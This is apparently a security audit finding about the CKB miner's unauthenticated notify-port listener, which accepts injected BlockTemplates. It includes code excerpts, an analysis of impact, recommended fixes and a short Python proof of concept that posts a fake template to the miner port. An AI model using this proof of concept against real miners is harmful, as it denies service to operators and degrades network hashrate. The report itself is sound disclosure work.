### Title
Unauthenticated Miner Notify Port Allows Arbitrary BlockTemplate Injection — (`miner/src/client.rs`)

---

### Summary

The miner's notify-mode HTTP listener accepts `BlockTemplate` pushes from **any** TCP client with zero authentication. An attacker who can reach the configured `listen` port can inject a crafted template whose `parent_hash` points to a non-existent block, causing all workers to mine on an invalid chain tip indefinitely.

---

### Finding Description

When `listen` is set in `[miner.client]`, `spawn_background` starts `listen_block_template_notify`, which binds a raw TCP listener and dispatches every incoming HTTP request to `handle`:

```rust
// miner/src/client.rs  lines 358-369
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);   // ← no auth, no validation
    }

    Ok(Response::new(Empty::new()))
}
``` [1](#0-0) 

There is no IP allowlist, no shared secret, no HMAC, and no TLS client certificate. The `ClientConfig` struct has no authentication field at all: [2](#0-1) 

`update_block_template` performs only a `work_id` deduplication check — trivially bypassed by using `work_id = 0` (the `id == 0` branch always accepts) or any value differing from the current one: [3](#0-2) 

The accepted template is converted to `Work` and sent as `Works::New(work)` to the miner loop. `notify_new_work` dispatches it to all workers provided the `parent_hash` is not already in `legacy_work`: [4](#0-3) 

When workers solve the PoW and `submit_nonce` fires, the block is submitted to the node. The node rejects it (unknown parent). The async path sends `Works::FailSubmit(parent)`, which **removes** the entry from `legacy_work`: [5](#0-4) [6](#0-5) 

This means the attacker can re-inject the same fake `parent_hash` after each rejection, keeping the miner permanently occupied on invalid work.

---

### Impact Explanation

- All worker threads mine on a block whose parent does not exist on the canonical chain.
- Every solved nonce is submitted and rejected; no valid block is ever produced.
- The miner is effectively removed from the network's hashrate.
- Targeting multiple miners degrades global hashrate, slowing block production network-wide.

---

### Likelihood Explanation

The default example config shows `listen = "127.0.0.1:8888"` (commented out), but the code accepts **any** `SocketAddr`. Operators who run the miner on a separate machine from the CKB node — a common production topology — must bind to a non-loopback address, exposing the port to the network. The `ClientConfig` struct provides no mechanism to add authentication even if the operator wanted to. The attack requires only a single HTTP POST with a valid JSON `BlockTemplate` body. [7](#0-6) 

---

### Recommendation

1. **Add a shared secret / bearer token** to `ClientConfig` and verify it in `handle` before calling `update_block_template`.
2. **Validate `parent_hash`** in `update_block_template` against the tip reported by the node's RPC before dispatching work to miners.
3. **Bind to loopback by default** and document that any non-loopback binding requires firewall protection.
4. Optionally, restrict accepted connections to the IP of the configured `rpc_url` host.

---

### Proof of Concept

```python
import requests, json, secrets

# Craft a BlockTemplate with a random (non-existent) parent_hash
fake_template = {
    "version": "0x0",
    "compact_target": "0x1a08a97e",
    "current_time": "0x174b3e8f000",
    "number": "0x1",
    "epoch": "0x3e80001000000",
    "parent_hash": "0x" + secrets.token_hex(32),   # ← crafted
    "cycles_limit": "0xd09dc300",
    "bytes_limit": "0x91c08",
    "uncles_count_limit": "0x2",
    "uncles": [],
    "transactions": [],
    "proposals": [],
    "cellbase": { ... },   # minimal valid cellbase
    "work_id": "0x0",      # work_id=0 always accepted
    "dao": "0x" + "00"*32,
    "extension": None,
    "block_assembler_message": None,
}

# POST to the miner notify port (replace with actual address)
r = requests.post("http://<miner-notify-host>:8888/", json=fake_template)
# Miner now mines on a block with a non-existent parent; node will reject every submission.
```
